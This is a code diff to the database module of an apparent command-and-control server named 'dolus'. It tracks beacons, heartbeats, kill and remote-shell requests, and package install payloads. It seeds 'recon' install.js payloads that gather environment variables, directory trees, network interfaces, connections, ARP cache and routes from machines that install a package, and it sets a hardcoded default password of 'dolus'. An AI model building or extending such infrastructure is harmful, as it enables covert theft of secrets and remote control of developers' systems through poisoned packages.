@@ -1,6 +1,8 @@
 import { DatabaseSync } from 'node:sqlite';
 import path from 'path';
 import fs from 'fs';
+import crypto from 'crypto';
+import { hashPassword } from './auth';
 
 const dbPath = process.env.DATABASE_PATH || path.join(process.cwd(), 'dolus.db');
 
@@ -64,16 +66,35 @@ CREATE TABLE IF NOT EXISTS heartbeats (
   beacon_id INTEGER NOT NULL REFERENCES beacons(id),
   ts        INTEGER NOT NULL DEFAULT (unixepoch())
 );
+
+CREATE TABLE IF NOT EXISTS settings (
+  key   TEXT PRIMARY KEY,
+  value TEXT NOT NULL
+);
+
+CREATE TABLE IF NOT EXISTS pow_challenges (
+  nonce      TEXT PRIMARY KEY,
+  created_at INTEGER NOT NULL DEFAULT (unixepoch())
+);
 `;
 
 db.exec(SCHEMA);
 // ponytail: idempotent column additions for existing DBs (ALTER TABLE throws if column exists)
 try { db.exec('ALTER TABLE beacons ADD COLUMN kill INTEGER NOT NULL DEFAULT 0'); } catch (_) {}
 try { db.exec('ALTER TABLE beacons ADD COLUMN destroyed_at INTEGER'); } catch (_) {}
+try { db.exec('ALTER TABLE beacons ADD COLUMN shell_requested INTEGER NOT NULL DEFAULT 0'); } catch (_) {}
 try { db.exec('ALTER TABLE packages ADD COLUMN account_id INTEGER REFERENCES accounts(id)'); } catch (_) {}
 try { db.exec('ALTER TABLE packages ADD COLUMN payload_id INTEGER REFERENCES payloads(id)'); } catch (_) {}
 
-// Seed built-in payloads (INSERT OR IGNORE — runs on every boot, no-ops after first)
+// Seed default settings (INSERT OR IGNORE — first boot only)
+const seedSetting = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
+seedSetting.run('password_hash', hashPassword('dolus'));
+seedSetting.run('beacon_secret', crypto.randomUUID());
+seedSetting.run('pow_enabled', '0');
+seedSetting.run('pow_difficulty', '5');
+seedSetting.run('shell_idle_timeout', '180');
+
+// Seed built-in payloads — always update install_js so new template changes take effect
 const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
 try {
   const basicJs = fs.readFileSync(path.join(TEMPLATE_DIR, 'install.js'), 'utf8');
@@ -90,8 +111,11 @@ payload.routes      = run('ip route 2>/dev/null || route -n 2>/dev/null');
 const body = JSON.stringify(payload);`
   );
   const seed = db.prepare('INSERT OR IGNORE INTO payloads (name, description, install_js, builtin) VALUES (?, ?, ?, 1)');
+  const updateJs = db.prepare('UPDATE payloads SET install_js = ? WHERE name = ? AND builtin = 1');
   seed.run('recon-basic', 'Hostname, OS, env vars, dir tree, network interfaces', basicJs);
+  updateJs.run(basicJs, 'recon-basic');
   seed.run('recon-extended', 'Basic + active TCP connections, ARP cache, routing table', extendedJs);
+  updateJs.run(extendedJs, 'recon-extended');
 } catch (_) { /* template dir not found, skip seeding */ }
 
 export default db;
